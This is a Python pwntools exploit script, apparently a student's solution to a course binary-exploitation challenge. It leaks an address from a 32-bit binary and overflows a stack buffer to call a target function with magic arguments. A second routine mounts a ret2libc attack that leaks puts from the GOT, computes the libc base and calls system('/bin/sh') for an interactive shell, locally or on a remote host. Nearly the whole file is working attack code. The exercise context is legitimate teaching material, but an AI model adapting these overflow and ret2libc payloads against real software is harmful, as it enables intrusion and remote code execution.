#!/usr/bin/env python3
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 10)

EXE_FILENAME='../pwn_student_binaries/call_me_marcocastagna99'

libc = None
if args.REMOTE:
     libc = ELF("../pwn_student_binaries/remote-libc/32-bits/libc.so.6")
else:
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
   

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}
gdbscript = '''
set startup-with-shell off
b printf
b puts

'''

def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)


EIP_OFFSET = 112  # Calculated with cyclic but there is an overflow in 104 bytes
LEAKED_OFFSET= 0x11ED
FUN_OFFSET= 0x12F8


def leak(io):
    io.sendline(b"Color me your color, baby")
    io.sendline(b"Color me your car")
    io.sendline(b"Color me your color, darling")

    output = io.recvuntil(b"&target=")
    output += io.recv(100) 


    leaked_address = None
    for line in output.splitlines():
        if b"&target=" in line:
            leaked_address = line.split(b"&target=")[1].strip()
            break

    if leaked_address:
        leaked_address = int(leaked_address, 16)
        print(f"Leaked address: 0x{leaked_address:x}")
        return leaked_address
    else:
        print("No leaked address found.")
        return None





def exploit():
    io = start()
    leaked_address = leak(io)
    param1=0x5e1ec7ed
    param2=0xca11ab1e
    param3=0xdeadfa11

    io.sendline(b"a" * EIP_OFFSET + p32(leaked_address) + b'a'* 4+ param1.to_bytes(4, byteorder='little') + param2.to_bytes(4, byteorder='little') + param3.to_bytes(4, byteorder='little'))
    flag = io.recvall().decode().strip()
    print(flag)
    io.close()


def exploit2():
    io = start()
    leaked_address = leak(io)
    base_address = leaked_address - LEAKED_OFFSET #correct
    print(f"Base address: 0x{base_address:x}")
   

    puts_plt = base_address + 4208 #correct
    puts_got =  base_address+ exe.got['puts'] 
    got_address = base_address + 0x003fb4  #correct
    return_addr = base_address + FUN_OFFSET #verify i correct  #where i want to jump, is the next instruction after the call puts
  #  print(f"puts: 0x{printf_got:x}")
    print(f"puts plt: 0x{puts_plt:x}")
    print(f"puts got: 0x{puts_got:x}")
    print(f"got address: 0x{got_address:x}")

  
    

    #io.sendline(b"a" * EIP_OFFSET + p32(got_address)+ b"\90"*4 + p32(puts_plt)+ p32(main_addr) + p32(puts_got))

    #the argument for puts are pushed in reverse order because of the calling convention, so firts I push a return address and then the interessted argument, so it prints the argument and the address of the firts push is ignored but i put it to continue the execution for another exploit.
    io.sendline(b"a" * (EIP_OFFSET-8) + p32(got_address)+ b"a" * 4  +p32(puts_plt) + p32(return_addr)+  p32(puts_got))

    

    
    response = io.recv(1024)
    print(response)

    address_bytes= response[:4]
    leaked_puts_address = unpack(address_bytes)
    print(f"Leaked address: 0x{leaked_puts_address:x}")

    base_libc = leaked_puts_address - libc.symbols['puts']
    print(f"Base libc address: 0x{base_libc:x}")
    system_addr = base_libc + libc.symbols['system']
    bin_sh_addr = base_libc + next(libc.search(b"/bin/sh"))
    exit_addr = base_libc + libc.symbols['exit']

    #the same here, first the exit second bin/sh string because first we execute system with bin sh and the we execute exit.
    io.sendline(b"a" * EIP_OFFSET + p32(system_addr) + p32(exit_addr) + p32(bin_sh_addr)) 
    io.interactive()
 

    io.close()


if __name__ == "__main__":
    exploit()
    #exploit2()




